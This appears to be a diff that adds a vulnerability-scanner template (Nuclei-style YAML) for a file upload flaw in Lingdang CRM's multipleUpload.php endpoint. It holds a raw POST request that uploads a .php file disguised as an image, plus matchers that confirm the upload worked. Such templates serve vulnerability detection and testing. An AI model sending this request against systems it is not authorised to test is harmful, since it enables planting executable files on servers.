@@ -1,0 +1,35 @@
+id: lingdangCRM-multipleUpload-upload
+
+info:
+  name: 灵当CRM系统接口multipleUpload.php文件上传漏洞
+  author: lingdangCRM
+  severity: high
+  tags: lingdangCRM
+
+http:
+  - raw:
+      - |
+        POST /crm/modules/Home/multipleUpload.php?myatt_id=1&myatt_moduel=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
+
+        ------WebKitFormBoundaryj7OlOPiiukkdktZR
+        Content-Disposition: form-data; name="file"; filename="39dpdskeds.php"
+        Content-Type: image/png
+        
+        {{randstr_1}}
+        ------WebKitFormBoundaryj7OlOPiiukkdktZR--
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"name":'
+          - '"storage'
+          - '"path":'
+        condition: and
+    matchers-condition: and
